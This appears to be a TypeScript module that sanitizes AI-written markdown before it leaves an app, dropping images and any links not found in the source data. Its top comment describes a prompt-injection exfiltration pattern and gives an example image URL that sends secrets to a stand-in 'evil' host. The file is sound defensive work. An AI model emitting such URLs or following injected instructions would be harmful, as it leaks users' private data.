import { Marked } from "marked";

/**
 * Outbound text built by a model from untrusted inputs is an exfiltration channel: a prompt-injected
 * brief could render `![](https://evil/?q=<secrets>)` or a link that leaks data when clicked
 * (the EchoLeak pattern). Before anything leaves Worklog we:
 *  - drop images entirely,
 *  - keep a link only if its exact URL appeared in the data the text was written from (or is ours),
 *  - escape raw HTML.
 */
export function sanitizeMarkdown(markdown: string, allowedUrls: Iterable<string>, publicUrl?: string): string {
  const allowed = new Set([...allowedUrls].filter(Boolean));
  const ok = (url: string) => allowed.has(url) || (publicUrl ? url.startsWith(publicUrl) : false);
  return (
    markdown
      // ![alt](url) and ![alt][ref] → nothing
      .replace(/!\[[^\]]*\]\([^)]*\)/g, "")
      .replace(/!\[[^\]]*\]\[[^\]]*\]/g, "")
      // reference-style definitions: [ref]: url
      .replace(/^\s*\[[^\]]+\]:\s*\S+.*$/gm, "")
      // [text](url "title") → keep or unwrap
      .replace(/\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+"[^"]*")?\s*\)/g, (_, text: string, url: string) => (ok(url) ? `[${text}](${url})` : text))
      // <https://autolinks>
      .replace(/<(https?:\/\/[^>\s]+)>/g, (_, url: string) => (ok(url) ? `<${url}>` : "(link removed)"))
      // bare URLs not already inside a markdown link
      .replace(/(^|[^(<\w])(https?:\/\/[^\s)>\]]+)/g, (m, pre: string, url: string) => (ok(url) ? m : `${pre}(link removed)`))
  );
}

/** Collects every URL-looking string in a data structure (the provenance allowlist). */
export function urlsIn(data: unknown): string[] {
  const out: string[] = [];
  const walk = (v: unknown) => {
    if (typeof v === "string") {
      for (const m of v.matchAll(/https?:\/\/[^\s)>\]"]+/g)) out.push(m[0]);
    } else if (Array.isArray(v)) v.forEach(walk);
    else if (v && typeof v === "object") Object.values(v).forEach(walk);
  };
  walk(data);
  return out;
}

const escapeHtml = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

const emailMarkdown = new Marked({
  renderer: {
    html: ({ text }) => escapeHtml(text),
    image: ({ text }) => escapeHtml(text),
  },
});

export async function toEmailHtml(markdown: string): Promise<string> {
  return emailMarkdown.parse(markdown);
}
